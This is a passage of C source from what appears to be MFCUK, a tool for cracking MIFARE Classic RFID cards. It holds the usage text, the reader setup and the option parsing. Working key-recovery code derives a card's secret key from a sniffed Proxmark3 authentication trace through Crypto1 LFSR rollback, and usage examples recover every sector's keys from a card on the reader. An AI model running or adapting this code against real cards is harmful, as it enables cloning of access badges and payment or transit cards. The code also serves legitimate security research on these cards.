  fprintf(fp, "-s - milliseconds to sleep for SLEEP_AT_FIELD_OFF (Default: %d ms)\n", SLEEP_AT_FIELD_OFF);
  fprintf(fp, "-S - milliseconds to sleep for SLEEP_AFTER_FIELD_ON (Default: %d ms)\n", SLEEP_AFTER_FIELD_ON);
  fprintf(fp, "-P hex_literals_separated - try to recover the key from a conversation sniffed with Proxmark3 (mifarecrack.c based). Accepts several options:\n");
  fprintf(fp, "\tConcatenated string in hex literal format of form uid:tag_chal:nr_enc:reader_resp:tag_resp\n");
  fprintf(fp, "\tExample -P 0x5c72325e:0x50829cd6:0xb8671f76:0xe00eefc9:0x4888964f would find key FFFFFFFFFFFF\n");
  fprintf(fp, "-p proxmark3_full.log - tries to parse the log file on it's own (mifarecrack.py based), get the values for option -P and invoke it\n");
  fprintf(fp, "-F - tries to fingerprint the input dump (-i) against known cards' data format\n");
  fprintf(fp, "-v verbose_level - verbose level (default is O)\n");
  fprintf(fp, "-w threshold - use weak card mode with the provided maxhi/lo threshold. Use it if you get 0x03 error.\n");
  fprintf(fp, "\n");

  fprintf(fp, "Usage examples:\n");
  fprintf(fp, "  Recover all keys from all sectors:\n");
  fprintf(fp, "    %s -C -R -1\n", prog_name);

  fprintf(fp, "  Recover the sector #0 key with 250 ms for all delays (delays could give more results): \n");
  fprintf(fp, "    %s -C -R 0 -s 250 -S 250\n", prog_name);
  return;
}

static void print_identification(void)
{
  fprintf(stdout, "%s - %s\n", PACKAGE_NAME, PACKAGE_VERSION);
  fprintf(stdout, "%s - %s\n", BUILD_NAME, BUILD_VERSION);
  fprintf(stdout, "by %s\n", BUILD_AUTHOR);
  fprintf(stdout, "\n");
}

static void print_mifare_classic_tag_actions(const char *title, mifare_classic_tag *tag)
{
  uint32_t i, max_blocks, trailer_block;
  uint8_t bTagType;
  mifare_classic_block_trailer *ptr_trailer = NULL;

  if (!tag) {
    return;
  }

  bTagType = tag->amb->mbm.btSAK;

  if (!IS_MIFARE_CLASSIC_1K(bTagType) && !IS_MIFARE_CLASSIC_4K(bTagType)) {
    return;
  }

  printf("%s - UID %02x %02x %02x %02x - TYPE 0x%02x (%s)\n",
         title, tag->amb->mbm.abtUID[0], tag->amb->mbm.abtUID[1], tag->amb->mbm.abtUID[2], tag->amb->mbm.abtUID[3], bTagType,
         (IS_MIFARE_CLASSIC_1K(bTagType) ? (MIFARE_CLASSIC_1K_NAME) : (IS_MIFARE_CLASSIC_4K(bTagType) ? (MIFARE_CLASSIC_4K_NAME) : (MIFARE_CLASSIC_UNKN_NAME)))
        );
  printf("---------------------------------------------------------------------\n");
  printf("Sector\t|    Key A\t|ACTS | RESL\t|    Key B\t|ACTS | RESL\n");
  printf("---------------------------------------------------------------------\n");

  if (IS_MIFARE_CLASSIC_1K(tag->amb->mbm.btSAK)) {
    max_blocks = MIFARE_CLASSIC_1K_MAX_BLOCKS;
  } else {
    max_blocks = MIFARE_CLASSIC_4K_MAX_BLOCKS;
  }

  for (i = 0; i < max_blocks; i++) {
    trailer_block = get_trailer_block(bTagType, i);

    if (!is_valid_block(bTagType, trailer_block)) {
      break;
    }

    ptr_trailer = (mifare_classic_block_trailer *)((char *)tag + (trailer_block * MIFARE_CLASSIC_BYTES_PER_BLOCK));

    printf("%d\t|  %02x%02x%02x%02x%02x%02x\t| %c %c | %c %c\t|  %02x%02x%02x%02x%02x%02x\t| %c %c | %c %c\n",
           get_sector_for_block(bTagType, trailer_block),
           ptr_trailer->abtKeyA[0], ptr_trailer->abtKeyA[1], ptr_trailer->abtKeyA[2],
           ptr_trailer->abtKeyA[3], ptr_trailer->abtKeyA[4], ptr_trailer->abtKeyA[5],
           (ptr_trailer->abtAccessBits[ACTIONS_KEY_A] & ACTIONS_VERIFY) ? 'V' : '.',
           (ptr_trailer->abtAccessBits[ACTIONS_KEY_A] & ACTIONS_RECOVER) ? 'R' : '.',
           (ptr_trailer->abtAccessBits[RESULTS_KEY_A] & ACTIONS_VERIFY) ? 'V' : '.',
           (ptr_trailer->abtAccessBits[RESULTS_KEY_A] & ACTIONS_RECOVER) ? 'R' : '.',
           ptr_trailer->abtKeyB[0], ptr_trailer->abtKeyB[1], ptr_trailer->abtKeyB[2],
           ptr_trailer->abtKeyB[3], ptr_trailer->abtKeyB[4], ptr_trailer->abtKeyB[5],
           (ptr_trailer->abtAccessBits[ACTIONS_KEY_B] & ACTIONS_VERIFY) ? 'V' : '.',
           (ptr_trailer->abtAccessBits[ACTIONS_KEY_B] & ACTIONS_RECOVER) ? 'R' : '.',
           (ptr_trailer->abtAccessBits[RESULTS_KEY_B] & ACTIONS_VERIFY) ? 'V' : '.',
           (ptr_trailer->abtAccessBits[RESULTS_KEY_B] & ACTIONS_RECOVER) ? 'R' : '.'
          );

    // Go beyond current trailer block, i.e. go to next sector
    i = trailer_block;
  }

  printf("\n");

  return;
}

static bool mfcuk_darkside_reset_advanced(nfc_device *pnd)
{
  if (0 > nfc_device_set_property_bool(pnd, NP_HANDLE_CRC, true)) {
    //ERR("configuring NP_HANDLE_CRC");
    //return false;
  }

  if (0 > nfc_device_set_property_bool(pnd, NP_HANDLE_PARITY, true)) {
    //ERR("configuring NP_HANDLE_PARITY");
    //return false;
  }

  return true;
}

static bool mfcuk_darkside_select_tag(nfc_device *pnd, int iSleepAtFieldOFF, int iSleepAfterFieldON, nfc_target_info *ti)
{
  nfc_target ti_tmp;

  if (!pnd || !ti) {
    ERR("some parameter are NULL");
    return false;
  }

  // Drop the field for a while, so the card can reset
  if (0 > nfc_device_set_property_bool(pnd, NP_ACTIVATE_FIELD, false)) {
    ERR("configuring NP_ACTIVATE_FIELD");
    return false;
  }

  // {WPMCC09} 2.4. Tag nonces: "drop the field (for approximately 30us) to discharge all capacitors"
  sleepmillis(iSleepAtFieldOFF);

  // Let the reader only try once to find a tag
  if (0 > nfc_device_set_property_bool(pnd, NP_INFINITE_SELECT, false)) {
    ERR("configuring NP_INFINITE_SELECT");
    return false;
  }

  // Configure the CRC and Parity settings
  if (0 > nfc_device_set_property_bool(pnd, NP_HANDLE_CRC, true)) {
    ERR("configuring NP_HANDLE_CRC");
    return false;
  }

  if (0 > nfc_device_set_property_bool(pnd, NP_HANDLE_PARITY, true)) {
    ERR("configuring NP_HANDLE_PARITY");
    return false;
  }

  // Enable field so more power consuming cards can power themselves up
  if (0 > nfc_device_set_property_bool(pnd, NP_ACTIVATE_FIELD, true)) {
    ERR("configuring NP_ACTIVATE_FIELD");
    return false;
  }

  // Switch the field back on, and wait for a constant amount of time before authenticating
  sleepmillis(iSleepAfterFieldON);

  // Poll for a ISO14443A (MIFARE) tag
  if (0 >= nfc_initiator_select_passive_target(pnd, nmMifare, NULL, 0, &ti_tmp)) {
    ERR("connecting to MIFARE Classic tag");
    return false;
  }

  memcpy(ti, &ti_tmp, sizeof(ti_tmp));

  return true;
}

int main(int argc, char *argv[])
{
  // getopt related
  int ch = 0;
  char strOutputFilename[256] = {0}; // Initialize with '\0' character
  //char extendedDescription[MFCUK_EXTENDED_DESCRIPTION_LENGTH] = {0}; // Initialize with '\0' character
  uint8_t keyOpt[MIFARE_CLASSIC_KEY_BYTELENGTH] = {0};
  uint8_t uidOpt[MIFARE_CLASSIC_UID_BYTELENGTH] = {0};
  mifare_classic_block_trailer *ptr_trailer = NULL;
  mifare_classic_block_trailer *ptr_trailer_dump = NULL;
  int sector = 0;
  uint32_t block = 0;
  uint8_t action = 0;
  uint8_t specific_key_type = 0;
  uint8_t max_sectors = MIFARE_CLASSIC_4K_MAX_SECTORS;
  // Defaults, can be overriden by -S and -s command line arguments
  int iSleepAtFieldOFF = SLEEP_AT_FIELD_OFF; // modified with argument -S
  int iSleepAfterFieldON = SLEEP_AFTER_FIELD_ON; // modified with argument -s

  char *token = NULL;
  const char *sep = ":";
  char *str = NULL;
  int iter = 0;

  // libnfc related
  nfc_context *context;
  nfc_device *pnd;
  nfc_target ti;

  // mifare and crapto related
  uint32_t uiErrCode = MFCUK_SUCCESS;
  uint64_t ui64KeyRecovered;
  mifare_classic_tag_ext dump_loaded_tag;
  mifare_classic_tag_ext tag_on_reader;
  mifare_classic_tag_ext tag_recover_verify;

  // fingerprint options related
  mifare_classic_tag finger_tag;
  float finger_score;
  float finger_score_highest;
  int finger_index_highest;

  // proxmark3 log related
#define PM3_UID             0
#define PM3_TAG_CHAL        1
#define PM3_NR_ENC          2
#define PM3_READER_RESP     3
#define PM3_TAG_RESP        4
#define PM3_MULTISECT_AUTH  5

  uint32_t pm3_full_set_log[5]; // order is: uid, tag_challenge, nr_enc, reader_response, tag_response
  uint32_t pm3_log_multisect_auth;
  uint32_t pm3_ks2;
  uint32_t pm3_ks3;
  struct Crypto1State *pm3_revstate = NULL;
  struct Crypto1State *pm3_revstate_multisect_auth = NULL;
  uint64_t pm3_lfsr;
  unsigned char *pm3_plfsr = (unsigned char *)&pm3_lfsr;
  uint8_t pm3_log_multisect_decrypted[4];
  uint8_t pm3_log_multisect_verified[4];

  // various related
  int i, j, k;
  size_t st;
  int numDefKeys = mfcuk_default_keys_num;
  uint8_t (*current_default_keys)[MIFARE_CLASSIC_KEY_BYTELENGTH];

  // At runtime, duplicate the mfcuk_default_keys[], and then add at it's bottom the default keys specified via -d command line options
  if (!(current_default_keys = malloc(numDefKeys * MIFARE_CLASSIC_KEY_BYTELENGTH))) {
    ERR("failed to allocate memory for current_default_keys");
    return EXIT_FAILURE;
  }

  // Init the structs
  memcpy(current_default_keys, mfcuk_default_keys, numDefKeys * MIFARE_CLASSIC_KEY_BYTELENGTH);
  memset(&dump_loaded_tag, 0, sizeof(dump_loaded_tag));
  memset(&tag_on_reader, 0, sizeof(tag_on_reader));
  memset(&tag_recover_verify, 0, sizeof(tag_recover_verify));

  tag_recover_verify.type = MIFARE_CLASSIC_4K;
  tag_recover_verify.tag_basic.amb[0].mbm.btSAK = MIFARE_CLASSIC_4K;

  // "Sort-of" initializing the entries
  memset((void *)arrSpoofEntries, 0, sizeof(arrSpoofEntries));

  // MAIN ( broken-brain (: ) logic of the tool
  // ---------------------------------------
  clear_screen();

  print_identification();

  if (argc < 2) {
    print_usage(stdout, argv[0]);
    return EXIT_FAILURE;
  }

  // Load fingerprinting "database"
  // mfcuk_finger_load();
  /*
      if (mfcuk_finger_load() == 0)
      {
          ERR ("Unable to load any fingerprinting database.");
          exit (EXIT_FAILURE);
      }
  */
  // OPTION PROCESSING BLOCK
  // TODO: for WIN32 figure out how to use unistd/posix-compatible Gnu.Getopt.dll (http://getopt.codeplex.com)
  // For WIN32 using VERY limited (modified) Xgetopt (http://www.codeproject.com/KB/cpp/xgetopt.aspx)
  while ((ch = getopt(argc, argv, "htTDCi:I:o:O:V:R:S:s:v:M:U:d:n:P:p:F:w:")) != -1) { // -1 or EOF
    switch (ch) {
        // Name for the extended dump
      case 'n':
        strncpy(tag_recover_verify.description, optarg, sizeof(tag_recover_verify.description));
        break;
      case 'C':
        bfOpts[ch] = true;
        break;
        // Additional default key option
      case 'd':
        memset(&keyOpt, 0, MIFARE_CLASSIC_KEY_BYTELENGTH);

        if (strlen(optarg) != (MIFARE_CLASSIC_KEY_BYTELENGTH * 2)) {
          // accept only 12 hex digits (fully qualified) Mifare Classic keys
          WARN("invalid length key argument (%s)", optarg);
          break;
        }

        for (st = 0; st < MIFARE_CLASSIC_KEY_BYTELENGTH; st++) {
          if (!is_hex(optarg[2 * st]) || !is_hex(optarg[2 * st + 1])) {
            // bad input hex string
            WARN("invalid hex chars in key argument (%s)", optarg);
            break;
          }
          keyOpt[st] = hex2bin(optarg[2 * st], optarg[2 * st + 1]);
        }

        // Increase number of keys
        numDefKeys++;

        // Also increase the memory to hold one more key. Hope not many keys will be specified,
        // so realloc() will not impact performance and will not fragment memory
        if (!(current_default_keys = realloc(current_default_keys, numDefKeys * MIFARE_CLASSIC_KEY_BYTELENGTH))) {
          ERR("failed to reallocate memory for current_default_keys");
          return EXIT_FAILURE;
        }

        memcpy(&(current_default_keys[numDefKeys - 1]), &keyOpt, MIFARE_CLASSIC_KEY_BYTELENGTH);

        // Mark current option as specified (though not used in any checks)
        bfOpts[ch] = true;

        // Force the use of default keys
        bfOpts['D'] = true;

        break;
        // Verbose option and level
      case 'v':
        if (!(i = atoi(optarg)) || (i < 1)) {
          WARN("non-supported verbose-level value (%s)", optarg);
        } else {
          verboseLevel = i;
          bfOpts[ch] = true;
        }
        break;

      case 'w':
    	if (!(i = atoi(optarg)) || (i < 1)) {
    		WARN("non-supported threshold value (%s)", optarg);
    	} else {
    		printf("TRESHOLD: %d\n",i);
    		weak_mifare_mode = true;
    		weak_mifare_threshold = i;
    	}
    	break;

      case 'M':
        // Mifare Classic type option
        if (!(i = atoi(optarg)) || (!IS_MIFARE_CLASSIC_1K(i) && !IS_MIFARE_CLASSIC_4K(i))) {
          WARN("non-supported tag type value (%s)", optarg);
        } else {
          tag_recover_verify.type = i;
          tag_recover_verify.tag_basic.amb[0].mbm.btSAK = i;
          bfOpts[ch] = true;
        }
        break;
      case 'U':
        // UID option
        if (strlen(optarg) != (MIFARE_CLASSIC_UID_BYTELENGTH * 2)) {
          // accept only 8 hex digits (fully qualified) Mifare Classic keys
          WARN("invalid length UID argument (%s)", optarg);
          break;
        }

        for (st = 0; st < MIFARE_CLASSIC_UID_BYTELENGTH; st++) {
          if (!is_hex(optarg[2 * st]) || !is_hex(optarg[2 * st + 1])) {
            // bad input hex string
            WARN("invalid hex chars in key argument (%s)", optarg);
            break;
          }
          uidOpt[st] = hex2bin(optarg[2 * st], optarg[2 * st + 1]);
        }

        if (st >= MIFARE_CLASSIC_UID_BYTELENGTH) {
          tag_recover_verify.uid = bswap_32_pu8(uidOpt);
          memcpy(tag_recover_verify.tag_basic.amb[0].mbm.abtUID, uidOpt, MIFARE_CLASSIC_UID_BYTELENGTH);
          bfOpts[ch] = true;
        }
        break;
      case 'S':
        // Sleep for "AT FIELD OFF"
        if (!(i = atoi(optarg)) || (i < 1) || (i > 10000)) {
          WARN("non-supported sleep-AT-field OFF value (%s)", optarg);
        } else {
          iSleepAtFieldOFF = i;
          bfOpts[ch] = true;
        }
        break;
      case 's':
        // Sleep for "AFTER FIELD ON"
        if (!(i = atoi(optarg)) || (i < 1) || (i > 10000)) {
          WARN("non-supported sleep-AFTER-field ON value (%s)", optarg);
        } else {
          iSleepAfterFieldON = i;
          bfOpts[ch] = true;
        }
        break;
      case 'D':
        // Use DEFAULT KEYS for verification of sectors and key-types marked as ACTIONS_VERIFY
        bfOpts[ch] = true;
        break;
      case 'R':
      case 'V':
        // Recover or Verify
        action = (ch == 'R') ? ACTIONS_RECOVER : ACTIONS_VERIFY;

        token = NULL;
        str = optarg;
        iter = 0;
        while ((token = strtok(str, sep)) && (iter < 3)) {
          switch (iter) {
              // Here is the sector argument
            case 0:
              // BUG: if sector is 0, atoi() returns 0 (ok); if sector is non-numeric, atoi() returns also 0 (not-ok) - cannot differentiate
              if (!(sector = atoi(token)) && (token[0] != '0')) {
                WARN("non-numeric sector argument (%s)", token);
                return EXIT_FAILURE;
              }

              // We don't know apriori whether loaded dump or the card on the reader is 1K or 4K, so assume validity for 4K
              if ((sector != -1) && !is_valid_sector(MIFARE_CLASSIC_4K, sector)) {
                WARN("invalid sector argument (%d)", sector);
                return EXIT_FAILURE;
              } else {
                for (i = ((sector == -1) ? (0) : (sector)); i < ((sector == -1) ? (MIFARE_CLASSIC_4K_MAX_SECTORS) : (sector + 1)); i++) {
                  // TODO: proper error handling for block and ptr_trailer
                  block = get_trailer_block_for_sector(MIFARE_CLASSIC_4K, i);
                  ptr_trailer = (mifare_classic_block_trailer *)((char *)(&tag_recover_verify.tag_basic) + (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));

                  ptr_trailer->abtAccessBits[ACTIONS_KEY_A] |= action;
                  ptr_trailer->abtAccessBits[ACTIONS_KEY_B] |= action;
                }
              }
              break;
              // Here is the key-type argument
              // after case 0, we can assume sector is a safe and valid sector
            case 1:
              switch (token[0]) {
                case 'A':
                case 'B':
                  specific_key_type = keyA + (token[0] - 'A');

                  // Invalidate all the opposite keys
                  for (i = ((sector == -1) ? (0) : (sector)); i < ((sector == -1) ? (MIFARE_CLASSIC_4K_MAX_SECTORS) : (sector + 1)); i++) {
                    // TODO: proper error handling for block and ptr_trailer
                    block = get_trailer_block_for_sector(MIFARE_CLASSIC_4K, i);
                    ptr_trailer = (mifare_classic_block_trailer *)((char *)(&tag_recover_verify.tag_basic) + (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));

                    ptr_trailer->abtAccessBits[ACTIONS_KEY_B * (1 - (token[0] - 'A'))] &= (~action);
                  }
                  break;
                default:
                  specific_key_type = 0;

                  // Validate all the key-types
                  for (i = ((sector == -1) ? (0) : (sector)); i < ((sector == -1) ? (MIFARE_CLASSIC_4K_MAX_SECTORS) : (sector + 1)); i++) {
                    // TODO: proper error handling for block and ptr_trailer
                    block = get_trailer_block_for_sector(MIFARE_CLASSIC_4K, i);
                    ptr_trailer = (mifare_classic_block_trailer *)((char *)(&tag_recover_verify.tag_basic) + (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));

                    ptr_trailer->abtAccessBits[ACTIONS_KEY_A] |= action;
                    ptr_trailer->abtAccessBits[ACTIONS_KEY_B] |= action;
                  }
                  break;
              }
              break;
              // Here is the key argument
              // after case 0, we can assume sector is a safe and valid sector
            case 2:
              // Recovery does not need a key
              if (ch == 'R') {
                break;
              }

              memset(&keyOpt, 0, MIFARE_CLASSIC_KEY_BYTELENGTH);

              if (strlen(token) != (MIFARE_CLASSIC_KEY_BYTELENGTH * 2)) {
                // accept only 12 hex digits (fully qualified) Mifare Classic keys
                WARN("invalid length key argument (%s)", token);
                break;
              }

              for (st = 0; st < MIFARE_CLASSIC_KEY_BYTELENGTH; st++) {
                if (!is_hex(token[2 * st]) || !is_hex(token[2 * st + 1])) {
                  // bad input hex string
                  WARN("invalid hex chars in key argument (%s)", token);
                  break;
                }
                keyOpt[st] = hex2bin(token[2 * st], token[2 * st + 1]);
              }

              for (i = ((sector == -1) ? (0) : (sector)); i < ((sector == -1) ? (MIFARE_CLASSIC_4K_MAX_SECTORS) : (sector + 1)); i++) {
                // TODO: proper error handling for block and ptr_trailer
                block = get_trailer_block_for_sector(MIFARE_CLASSIC_4K, i);
                ptr_trailer = (mifare_classic_block_trailer *)((char *)(&tag_recover_verify.tag_basic) + (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));

                if (!specific_key_type || specific_key_type == keyA) {
                  memcpy(&(ptr_trailer->abtKeyA[0]), keyOpt, sizeof(keyOpt));
                  ptr_trailer->abtAccessBits[ACTIONS_KEY_A] |= ACTIONS_KEYSET;
                }

                if (!specific_key_type || specific_key_type == keyB) {
                  memcpy(&(ptr_trailer->abtKeyB[0]), keyOpt, sizeof(keyOpt));
                  ptr_trailer->abtAccessBits[ACTIONS_KEY_B] |= ACTIONS_KEYSET;
                }
              }
              break;
              // We do not support any other arguments for now for -R/-V option
            default:
              break;
          }
          str = NULL;
          iter++;
        }
        break;
      case 'i':
        // Input simple dump file of type mifare_classic_tag, Options i and I are autoexclusive
        if (!bfOpts['i'] && !bfOpts['I']) {
          if (!mfcuk_load_tag_dump(optarg, &(dump_loaded_tag.tag_basic))) {
            WARN("Unable to load tag dump from '%s'", optarg);
          } else {
            bfOpts[ch] = true;
          }
        }
        break;
      case 'I':
        // Input extended dump file of type mifare_classic_tag_ext, Options i and I are autoexclusive
        if (!bfOpts['i'] && !bfOpts['I']) {
          if (!mfcuk_load_tag_dump_ext(optarg, &(dump_loaded_tag))) {
            WARN("Unable to load tag dump from '%s'", optarg);
          } else {
            bfOpts[ch] = true;
          }
        }
        break;
      case 'o':
      case 'O':
        // Output simple/extended dump file, Options o and O are autoexclusive
        if (!bfOpts['o'] && !bfOpts['O']) {
          strncpy(strOutputFilename, optarg, sizeof(strOutputFilename));
          bfOpts[ch] = true;
        }
        break;
        // Run just test-cases for verifying the correctnes of is_ and get_ block/sector functions
      case 't':
        // Requested test of Mifare Classic 1K Blocks and Sectors functionality
        test_mifare_classic_blocks_sectors_functions(MIFARE_CLASSIC_1K);
        bfOpts[ch] = true;
        break;
      case 'T':
        // Requested test of Mifare Classic 4K Blocks and Sectors functionality
        test_mifare_classic_blocks_sectors_functions(MIFARE_CLASSIC_4K);
        bfOpts[ch] = true;
        break;
      case 'P':
        token = NULL;
        str = optarg;
        iter = 0;

        // parse the arguments of the option. ugly, ugly... i know :-S
        while ((token = strtok(str, sep)) && (iter < (int)(sizeof(pm3_full_set_log) / sizeof(pm3_full_set_log[0])))) {
          str = NULL;
          errno = 0;
          pm3_full_set_log[iter] = strtoul(token, NULL, 16);

          // strtoul failed somewhere. WTF?! strtoul() is not properly setting errno... errrrrggh!
          if (errno != 0) {
            WARN("Invalid hex literal %s for option -P at position %d", optarg, iter);
          }

          iter++;
        }

        // if not all arguments were fine, fire warning
        if (iter != sizeof(pm3_full_set_log) / sizeof(pm3_full_set_log[0])) {
          WARN("Invalid number of hex literal for option -P");
        }
        // otherwise try to recover
        else {
          /*
          // TODO: implement better this function
          mfcuk_get_key_from_full_state(pm3_full_set, &ui64_lsfr);
          */
          pm3_ks2 = pm3_full_set_log[PM3_READER_RESP] ^ prng_successor(pm3_full_set_log[PM3_TAG_CHAL], 64);
          pm3_ks3 = pm3_full_set_log[PM3_TAG_RESP] ^ prng_successor(pm3_full_set_log[PM3_TAG_CHAL], 96);

          pm3_revstate = lfsr_recovery64(pm3_ks2, pm3_ks3);
          lfsr_rollback_word(pm3_revstate, 0, 0);
          lfsr_rollback_word(pm3_revstate, 0, 0);
          lfsr_rollback_word(pm3_revstate, pm3_full_set_log[PM3_NR_ENC], 1);
          lfsr_rollback_word(pm3_revstate, pm3_full_set_log[PM3_UID] ^ pm3_full_set_log[PM3_TAG_CHAL], 0);
          crypto1_get_lfsr(pm3_revstate, &pm3_lfsr);
          printf("proxmark3 log key: %02x%02x%02x%02x%02x%02x\n", pm3_plfsr[5], pm3_plfsr[4], pm3_plfsr[3], pm3_plfsr[2], pm3_plfsr[1], pm3_plfsr[0]);
          crypto1_destroy(pm3_revstate);

          // If all minimum required details from the log were parsed and still there are some more hex tokens, it might be a multi-sector authentication test request
          if (token) {
            errno = 0;
            pm3_log_multisect_auth = strtoul(token, NULL, 16);

            // strtoul failed somewhere. WTF?! strtoul() is not properly setting errno... errrrrggh!
            if (errno != 0) {
              WARN("Invalid hex literal %s for option -P at position %d", optarg, iter);
            } else {
              // TODO: what if the multi-sect authentication comes not directly after the first successful plain authentication, i.e. several read/write/incr/decr command occur first then multi-sect auth?! how does this affects the crypto stream/state, what should we do? need to simulate with a nfc-multisect-auth program which has tests with interleaved multi-sect authentications
              pm3_revstate_multisect_auth = lfsr_recovery64(pm3_ks2, pm3_ks3);

              for (i = 0; i < 4; i++) {
                uint8_t multisect_auth_byte = (pm3_log_multisect_auth >> (8 * (3 - i))) & 0xFF;
                pm3_log_multisect_decrypted[i] = crypto1_byte(pm3_revstate_multisect_auth, 0x00, 0) ^ multisect_auth_byte;
                pm3_log_multisect_verified[i] = pm3_log_multisect_decrypted[i];
              }

              // TODO: This "<= MIFARE_CLASSIC_4K_MAX_BLOCKS" should be properly checked against either MIFARE_CLASSIC_1K_MAX_BLOCKS or MIFARE_CLASSIC_4K_MAX_BLOCKS (depending on card type detected)
              if ((pm3_log_multisect_decrypted[0] == MC_AUTH_A) || (pm3_log_multisect_decrypted[0] == MC_AUTH_B)) {
                iso14443a_crc_append(pm3_log_multisect_verified, 2);
                int multisect_auth_verified = 1;
                for (i = 0; i < 4; i++) {
                  if (pm3_log_multisect_verified[i] != pm3_log_multisect_decrypted[i]) {
                    multisect_auth_verified = 0;
                    break;
                  }
                }

                printf("proxmark3 log multi-sect auth detected: %02X %02X %02X %02X (parity crc %s)\n", pm3_log_multisect_decrypted[0], pm3_log_multisect_decrypted[1], pm3_log_multisect_decrypted[2], pm3_log_multisect_decrypted[3], multisect_auth_verified ? "ok" : "NOK");
              }

              crypto1_destroy(pm3_revstate_multisect_auth);
            }
          }
        }
        break;
      case 'p':
        /*
        if (mfcuk_pm3_parse_log(optarg, pm3_full_set))
        {
            mfcuk_get_key_from_full_state(pm3_full_set, &ui64_lsfr);
        }
        else
        {
        }
        */
        printf("NOT IMPLEMENTED YET...\n");
        break;
      case 'F':
        if (!mfcuk_load_tag_dump(optarg, &(finger_tag))) {
          WARN("Unable to load tag dump from '%s'", optarg);
        } else {
          finger_score_highest = -1.0f;
          finger_index_highest = -1;
          for (i = 0; i < mfcuk_finger_db_entries; i++) {
            finger_score = -1.0f;
            mfcuk_finger_db[i].tmpl_comparison_func(&(finger_tag), mfcuk_finger_db[i].tmpl_data, &finger_score);

            if (finger_score > finger_score_highest) {
              finger_score_highest = finger_score;
              finger_index_highest = i;
            }
          }

          if (finger_index_highest > -1) {
            printf("Tag '%s' matches '%s' with highest score %f\n", optarg, mfcuk_finger_db[finger_index_highest].tmpl_name, finger_score_highest);
            mfcuk_finger_db[finger_index_highest].tmpl_decoder_func(&(finger_tag));
          } else {
            printf("No template found to match tag '%s'\n", optarg);
          }
        }
        break;
      case 'h':
        // Help screen
        print_usage(stdout, argv[0]);
        return EXIT_SUCCESS;
        break;
      case '?':
      default:
        // Help screen, on error output
        ERR("Unknown option %c\n", ch);
        print_usage(stderr, argv[0]);
        return EXIT_FAILURE;
        break;
    }
  }

  // Unload fingerprinting
  mfcuk_finger_unload();

  // If tests were requested, exit after tests completed
  if (bfOpts['t'] || bfOpts['T']) {
    return EXIT_SUCCESS;
  }

  // In case default keys requested (and maybe more specified on command line),
  // print the default keys which will be used
  if (bfOpts['D']) {
    if (bfOpts['v'] && (verboseLevel > 0)) {
      printf("DEFAULT KEYS:\n");

      // Skip the key at index 0, since it is initially 0x0 and is reserved for the loaded dump key
      for (i = 1; i < numDefKeys; i++) {
        printf("\t");
        print_hex(current_default_keys[i], MIFARE_CLASSIC_KEY_BYTELENGTH);
      }
    }
  }

  if (bfOpts['i'] || bfOpts['I']) {
    if (bfOpts['v'] && (verboseLevel > 0)) {
      print_mifare_classic_tag_keys("LOADED TAG DUMP", &(dump_loaded_tag.tag_basic));
    }

    // Overwrite from the loaded dump only the keys for sectors and keys which were not specified on command line
    for (i = 0; i < MIFARE_CLASSIC_4K_MAX_SECTORS; i++) {
      // TODO: proper error handling for block and ptr_trailer
      block = get_trailer_block_for_sector(MIFARE_CLASSIC_4K, i);
      ptr_trailer = (mifare_classic_block_trailer *)((char *)(&tag_recover_verify.tag_basic) + (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));
      ptr_trailer_dump = (mifare_classic_block_trailer *)((char *)(&dump_loaded_tag.tag_basic) + (block * MIFARE_CLASSIC_BYTES_PER_BLOCK));

      // If no command line keyA is set, copy from loaded dump
      if (!(ptr_trailer->abtAccessBits[ACTIONS_KEY_A] & ACTIONS_KEYSET)) {
        memcpy(&(ptr_trailer->abtKeyA[0]), &(ptr_trailer_dump->abtKeyA[0]), MIFARE_CLASSIC_KEY_BYTELENGTH);
        // TODO: think if to make this sector ACTIONS_KEYSET or introduce a new value ACTIONS_KEYLOAD
      }

      // If no command line keyB is set, copy from loaded dump
      if (!(ptr_trailer->abtAccessBits[ACTIONS_KEY_B] & ACTIONS_KEYSET)) {
        memcpy(&(ptr_trailer->abtKeyB[0]), &(ptr_trailer_dump->abtKeyB[0]), MIFARE_CLASSIC_KEY_BYTELENGTH);
        // TODO: think if to make this sector ACTIONS_KEYSET or introduce a new value ACTIONS_KEYLOAD
      }
    }

    // If no command line UID supplied and not tag-type specified, copy the manufacturer block from the loaded dump
    if (!bfOpts['U'] && !bfOpts['M']) {
      ptr_trailer = (mifare_classic_block_trailer *)((char *)(&tag_recover_verify.tag_basic) + (0 * MIFARE_CLASSIC_BYTES_PER_BLOCK));
      ptr_trailer_dump = (mifare_classic_block_trailer *)((char *)(&dump_loaded_tag.tag_basic) + (0 * MIFARE_CLASSIC_BYTES_PER_BLOCK));

      memcpy(ptr_trailer, ptr_trailer_dump, sizeof(*ptr_trailer));
      tag_recover_verify.type = tag_recover_verify.tag_basic.amb[0].mbm.btSAK;
      tag_recover_verify.uid = bswap_32_pu8(tag_recover_verify.tag_basic.amb[0].mbm.abtUID);
    }
  }

  if (!bfOpts['C']) {
    printf("No connection to reader requested (need option -C). Exiting...\n");
    return EXIT_SUCCESS;
  }
  // Try to open the NFC reader

  nfc_init(&context);
  if (context == NULL) {
      ERR("Unable to init libnfc (malloc)");
      goto error;
  }

  nfc_connstring connstrings[MAX_DEVICE_COUNT];
  size_t szDeviceFound = nfc_list_devices(context, connstrings, MAX_DEVICE_COUNT);

  if (szDeviceFound == 0) {
      printf("No NFC device found.\n");
      nfc_exit(context);
      goto error;
  }
  pnd = nfc_open(context, connstrings[0]);
  // READER INITIALIZATION BLOCK

  // Initialise NFC device as "initiator"
  if (nfc_initiator_init(pnd) < 0) {
      nfc_perror(pnd, "nfc_initiator_init");
      nfc_close(pnd);
      nfc_exit(context);
    ERR("initializing NFC reader: %s", nfc_device_get_name(pnd));
    goto error;
  }

  printf("\nINFO: Connected to NFC reader: %s\n\n", nfc_device_get_name(pnd));

  // Select tag and get tag info
  if (!mfcuk_darkside_select_tag(pnd, iSleepAtFieldOFF, iSleepAfterFieldON, &ti.nti)) {
    ERR("selecting tag on the reader %s", nfc_device_get_name(pnd));
    goto error;
  }

  mfcuk_darkside_reset_advanced(pnd);

  // Tag on the reader type
  tag_on_reader.type = ti.nti.nai.btSak;
  tag_on_reader.tag_basic.amb[0].mbm.btSAK = ti.nti.nai.btSak;

  // No command line tag type specified, take it from the tag on the reader
  if (!bfOpts['M']) {
